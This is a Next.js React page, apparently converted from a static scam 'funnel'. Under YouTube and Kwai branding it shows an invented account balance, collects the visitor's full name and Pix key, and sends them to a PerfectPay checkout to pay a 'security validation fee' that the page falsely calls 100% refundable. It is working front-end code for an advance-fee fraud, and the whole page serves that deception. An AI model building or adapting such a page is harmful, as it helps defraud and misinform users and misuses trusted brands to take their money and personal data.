'use client'

import Script from 'next/script'

// Tailwind config (inline no <head> original) — carregado antes de interativo
const tailwindConfig = `
tailwind.config = {
  theme: {
    extend: {
      colors: {
        "yt-black": "#050811",
        "yt-gray": "#13233c",
        "yt-red": "#ff0000"
      },
      fontFamily: {
        roboto: ["Roboto", "sans-serif"],
        oswald: ["Oswald", "sans-serif"],
        "roboto-condensed": ['"Roboto Condensed"', "sans-serif"]
      }
    }
  }
};
`

// Pixel Utmify (inline no <head> original)
const utmifyPixel = `
window.pixelId = "6a22e9983c66ac1b9c986167";
var a = document.createElement("script");
a.setAttribute("async", "");
a.setAttribute("defer", "");
a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
document.head.appendChild(a);
`

// Lógica inline da página (rodapé do <body> original), preservada byte-a-byte.
// Único ajuste: o bloco DOMContentLoaded roda também quando o DOM já está pronto
// (necessário no ambiente Next, onde este script é injetado após o load).
const confirmInline = `
const headerBalance = document.getElementById("header-balance");
function __confirmHeaderInit() {
  if (window.appState) {
    window.appState.subscribe((balance) => {
      headerBalance.textContent = window.appState.formatMoney(balance);
    });
  }
  if (typeof lucide !== 'undefined') {
    lucide.createIcons();
  }
}
if (document.readyState === 'loading') {
  document.addEventListener("DOMContentLoaded", __confirmHeaderInit);
} else {
  __confirmHeaderInit();
}

const nameInput = document.getElementById("name");
const pixKeyInput = document.getElementById("pix-key");
const pixTypeInput = document.getElementById("pix-type");

nameInput.addEventListener("input", function (e) {
  e.target.value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\\s]/g, "");
});

function maskCPF(value) {
  return value
    .replace(/\\D/g, "")
    .replace(/(\\d{3})(\\d)/, "$1.$2")
    .replace(/(\\d{3})(\\d)/, "$1.$2")
    .replace(/(\\d{3})(\\d{1,2})/, "$1-$2")
    .replace(/(-\\d{2})\\d+?$/, "$1");
}

function maskPhone(value) {
  return value
    .replace(/\\D/g, "")
    .replace(/(\\d{2})(\\d)/, "($1) $2")
    .replace(/(\\d{5})(\\d)/, "$1-$2")
    .replace(/(-\\d{4})\\d+?$/, "$1");
}

function selectPixType(type) {
  pixTypeInput.value = type;
  pixKeyInput.value = "";

  document.querySelectorAll(".pix-type-btn").forEach((btn) => {
    btn.className = "pix-type-btn bg-[#070e1b] border border-[#13233c] rounded-lg py-2.5 text-xs font-bold text-zinc-400 hover:border-zinc-700 transition-all active:scale-95 text-center";
  });

  const activeBtn = document.getElementById(\`btn-\${type}\`);
  activeBtn.className = "pix-type-btn bg-gradient-to-r from-[#00df89] to-[#adff2f] text-black border-transparent font-bold rounded-lg py-2.5 text-xs transition-all active:scale-95 text-center";

  switch (type) {
    case "cpf":
      pixKeyInput.placeholder = "000.000.000-00";
      pixKeyInput.maxLength = 14;
      pixKeyInput.type = "tel";
      break;
    case "email":
      pixKeyInput.placeholder = "seu@email.com";
      pixKeyInput.maxLength = 100;
      pixKeyInput.type = "email";
      break;
    case "phone":
      pixKeyInput.placeholder = "(00) 00000-0000";
      pixKeyInput.maxLength = 15;
      pixKeyInput.type = "tel";
      break;
    case "random":
      pixKeyInput.placeholder = "Chave Aleat&oacute;ria";
      pixKeyInput.maxLength = 100;
      pixKeyInput.type = "text";
      break;
  }
}

selectPixType("cpf");

pixKeyInput.addEventListener("input", function (e) {
  const type = pixTypeInput.value;
  let value = e.target.value;

  if (type === "cpf") {
    value = value.replace(/\\D/g, "");
    e.target.value = maskCPF(value);
  } else if (type === "phone") {
    value = value.replace(/\\D/g, "");
    e.target.value = maskPhone(value);
  } else if (type === "email") {
    e.target.value = value.replace(/[^a-zA-Z0-9@._-]/g, "");
  } else if (type === "random") {
    e.target.value = value.replace(/[^a-zA-Z0-9-]/g, "");
  }
});

function showInlineError(elementId, message) {
  const errorSpan = document.getElementById(elementId);
  errorSpan.textContent = message;
  errorSpan.classList.remove("hidden");
  const inputId = elementId.replace("error-", "");
  const input = document.getElementById(inputId);
  if (input) {
    input.classList.add("border-red-400");
    setTimeout(() => input.classList.remove("border-red-400"), 2000);
  }
}

function clearErrors() {
  document.getElementById("error-name").classList.add("hidden");
  document.getElementById("error-pix-key").classList.add("hidden");
}

function handleCheckout() {
  const name = document.getElementById("name").value;
  const key = document.getElementById("pix-key").value;
  const type = document.getElementById("pix-type").value;

  clearErrors();
  let hasError = false;

  if (!name) {
    showInlineError("error-name", "Por favor, preencha seu nome.");
    hasError = true;
  }

  if (!key) {
    showInlineError(
      "error-pix-key",
      "Por favor, preencha sua chave Pix.",
    );
    hasError = true;
  } else {
    if (type === "email") {
      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
      if (!emailRegex.test(key)) {
        showInlineError(
          "error-pix-key",
          "Por favor, insira um e-mail v&aacute;lido.",
        );
        hasError = true;
      }
    }

    if (type === "cpf" && key.length < 14) {
      showInlineError(
        "error-pix-key",
        "Por favor, insira um CPF v&aacute;lido.",
      );
      hasError = true;
    }

    if (type === "phone" && key.length < 14) {
      showInlineError(
        "error-pix-key",
        "Por favor, insira um celular v&aacute;lido.",
      );
      hasError = true;
    }
  }

  if (hasError) return;

  const checkoutUrl = new URL("https://go.perfectpay.com.br/PPU38CQ9ABM");
  const currentParams = new URLSearchParams(window.location.search);

  currentParams.forEach((value, key) => {
    checkoutUrl.searchParams.append(key, value);
  });

  checkoutUrl.searchParams.append("custom_name", name);
  checkoutUrl.searchParams.append("custom_pix_key", key);
  checkoutUrl.searchParams.append("custom_pix_type", type);

  if (!checkoutUrl.searchParams.has("ref")) {
    checkoutUrl.searchParams.append("ref", "");
  }

  window.location.href = checkoutUrl.toString();
}

window.selectPixType = selectPixType;
window.handleCheckout = handleCheckout;
`

export default function ConfirmPage() {
  return (
    <>
      {/* ===== <head> original ===== */}
      <title>Confirmar Pix</title>
      <meta charSet="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="icon" type="image/png" sizes="32x32" href="/images/cropped-1384060-32x32.png" />
      <link rel="apple-touch-icon" sizes="180x180" href="/images/cropped-1384060-180x180.png" />

      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
      <link
        href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;700&family=Roboto+Condensed:wght@400;700&family=Roboto:wght@300;400;500;700&display=swap"
        rel="stylesheet"
      />
      <link rel="stylesheet" href="/assets/css/style.css" />

      {/* <style> inline original — mantido igual */}
      <style>{`
      body {
        background-color: #050811;
        color: #ffffff;
      }
      .input-minimal {
        background-color: transparent;
        border-bottom: 2px solid #13233c;
        transition: border-color 0.3s;
      }
      .input-minimal:focus {
        border-color: #adff2f;
        outline: none;
      }
    `}</style>

      {/* Tailwind via CDN + config (beforeInteractive p/ classes funcionarem) */}
      <Script src="https://cdn.tailwindcss.com" strategy="beforeInteractive" />
      <Script
        id="tailwind-config"
        strategy="beforeInteractive"
        dangerouslySetInnerHTML={{ __html: tailwindConfig }}
      />

      {/* Scripts do funil (originalmente no <head>) */}
      <Script src="/assets/js/data.js?v=20260609-names1" strategy="beforeInteractive" />
      <Script src="/assets/js/state.js" strategy="beforeInteractive" />
      <Script src="/assets/js/funnel.js" strategy="beforeInteractive" />

      {/* Ícones Lucide */}
      <Script src="https://unpkg.com/lucide@latest" strategy="beforeInteractive" />

      {/* Utmify */}
      <Script id="utmify-pixel" strategy="afterInteractive" dangerouslySetInnerHTML={{ __html: utmifyPixel }} />
      <Script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-xcod-sck
        data-utmify-prevent-subids
        strategy="afterInteractive"
      />

      {/* ===== <body> original (classes no wrapper) ===== */}
      <div className="font-roboto min-h-screen bg-[#050505] relative overflow-x-hidden selection:bg-red-500/30">
        <div className="fixed inset-0 pointer-events-none z-0">
          <div className="absolute top-[-20%] left-[-10%] w-[60%] h-[60%] bg-red-600/15 rounded-full blur-[120px]"></div>
          <div className="absolute bottom-[-20%] right-[-10%] w-[60%] h-[60%] bg-orange-600/15 rounded-full blur-[120px]"></div>
        </div>

        <div className="relative z-10 w-full min-h-screen flex flex-col">
          <header className="sticky top-0 z-50 bg-[#050811]/90 backdrop-blur-md border-b border-zinc-800/60 px-4 sm:px-6 py-3 flex flex-col items-center justify-center gap-2 transition-all duration-300">
            <div className="flex flex-wrap items-center justify-center gap-3 sm:gap-4 w-full select-none">
              <div className="flex items-center gap-2">
                <img src="/assets/youtube_icon.svg" className="h-7 w-auto drop-shadow-[0_0_10px_rgba(255,0,0,0.14)]" alt="YouTube" />
                <span className="text-white font-black text-[1.7rem] leading-none tracking-[-0.04em] font-roboto-condensed">YouTube</span>
              </div>

              <span className="text-gray-400 font-light text-lg">&times;</span>

              <div className="flex items-center">
                <img src="/assets/kwai_logo.png" className="h-[3.45rem] w-auto object-contain drop-shadow-[0_0_12px_rgba(255,145,0,0.14)]" alt="Kwai" />
              </div>
            </div>

            <div className="flex items-center justify-center w-full max-w-xs mt-0.5">
              <div className="flex items-center justify-between w-full glass-pill px-5 py-2 animate-scale-in">
                <span className="text-[10px] text-zinc-400 font-medium tracking-widest uppercase">Saldo Dispon&iacute;vel</span>
                <span id="header-balance" className="text-[#adff2f] font-bold font-mono text-xl tracking-tight">R$ 0,00</span>
              </div>
            </div>
          </header>

          <main className="flex-1 flex flex-col items-center justify-center px-4 py-8">
            <div className="w-full max-w-md glass-panel p-6 relative overflow-hidden animate-scale-in">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#00df89] to-[#adff2f]"></div>

              <div className="mb-6 text-center select-none">
                <h1 className="text-2xl font-black font-oswald uppercase italic text-white mb-1 tracking-tight">Quase l&aacute;!</h1>
                <p className="text-gray-300 text-xs font-medium">
                  Confirme seus dados para receber o saque via Pix.
                </p>
              </div>

              <form
                onSubmit={(event) => {
                  event.preventDefault()
                  ;(window as unknown as { handleCheckout: () => void }).handleCheckout()
                }}
                className="space-y-6"
              >
                <div className="space-y-4">
                  <div className="relative">
                    <input
                      type="text"
                      id="name"
                      required
                      className="input-minimal w-full py-3 text-white placeholder-gray-500 appearance-none focus:outline-none font-medium text-sm"
                      placeholder="Nome Completo do Benefici&aacute;rio"
                    />
                    <span
                      id="error-name"
                      className="text-red-400 text-xs mt-1.5 block hidden font-bold animate-pulse"
                    ></span>
                  </div>

                  <div>
                    <label className="block text-gray-400 text-[10px] uppercase font-black tracking-wider mb-3 select-none">Tipo de Chave Pix</label>
                    <div className="grid grid-cols-4 gap-2 mb-4 select-none">
                      <button
                        type="button"
                        onClick={() => (window as unknown as { selectPixType: (t: string) => void }).selectPixType('cpf')}
                        id="btn-cpf"
                        className="pix-type-btn bg-[#070e1b] border border-[#13233c] rounded-lg py-2.5 text-xs font-bold text-zinc-400 hover:border-zinc-700 transition-all active:scale-95 text-center"
                      >
                        CPF
                      </button>
                      <button
                        type="button"
                        onClick={() => (window as unknown as { selectPixType: (t: string) => void }).selectPixType('email')}
                        id="btn-email"
                        className="pix-type-btn bg-[#070e1b] border border-[#13233c] rounded-lg py-2.5 text-xs font-bold text-zinc-400 hover:border-zinc-700 transition-all active:scale-95 text-center"
                      >
                        E-mail
                      </button>
                      <button
                        type="button"
                        onClick={() => (window as unknown as { selectPixType: (t: string) => void }).selectPixType('phone')}
                        id="btn-phone"
                        className="pix-type-btn bg-[#070e1b] border border-[#13233c] rounded-lg py-2.5 text-xs font-bold text-zinc-400 hover:border-zinc-700 transition-all active:scale-95 text-center"
                      >
                        Celular
                      </button>
                      <button
                        type="button"
                        onClick={() => (window as unknown as { selectPixType: (t: string) => void }).selectPixType('random')}
                        id="btn-random"
                        className="pix-type-btn bg-[#070e1b] border border-[#13233c] rounded-lg py-2.5 text-xs font-bold text-zinc-400 hover:border-zinc-700 transition-all active:scale-95 text-center"
                      >
                        Aleat&oacute;ria
                      </button>
                    </div>
                    <input type="hidden" id="pix-type" defaultValue="cpf" />

                    <div className="relative group">
                      <input
                        type="text"
                        id="pix-key"
                        required
                        className="input-minimal w-full py-3 text-white placeholder-zinc-650 appearance-none focus:outline-none bg-transparent font-medium text-sm"
                        placeholder="000.000.000-00"
                      />
                    </div>
                    <span
                      id="error-pix-key"
                      className="text-red-400 text-xs mt-1.5 block hidden font-bold animate-pulse"
                    ></span>
                  </div>
                </div>

                <div className="bg-[#050e1a]/85 rounded-xl p-4 border border-[#13233c] flex gap-3 items-start shadow-inner select-none">
                  <i data-lucide="info" className="w-4 h-4 text-[#adff2f] flex-shrink-0 mt-0.5 animate-pulse"></i>
                  <p className="text-[11px] text-gray-300 leading-relaxed font-medium">
                    A taxa de valida&ccedil;&atilde;o de seguran&ccedil;a &eacute;
                    <strong className="text-[#adff2f] font-black"> 100% reembols&aacute;vel</strong> e retornar&aacute; para sua conta
                    junto com o valor do saque.
                  </p>
                </div>

                <button
                  type="submit"
                  className="w-full bg-[#17d966] hover:bg-[#19e96d] text-[#04100b] font-black py-4 rounded-xl shadow-lg transition-all hover:scale-[1.01] active:scale-95 text-sm uppercase flex items-center justify-center gap-2 group"
                >
                  <span>Pagar Taxa e Receber Ganhos</span>
                  <i data-lucide="arrow-right" className="w-4 h-4 text-black group-hover:translate-x-1 transition-transform"></i>
                </button>
              </form>
            </div>
          </main>
        </div>
      </div>

      {/* Lógica inline original (rodapé do body) */}
      <Script id="confirm-inline" strategy="afterInteractive" dangerouslySetInnerHTML={{ __html: confirmInline }} />
    </>
  )
}
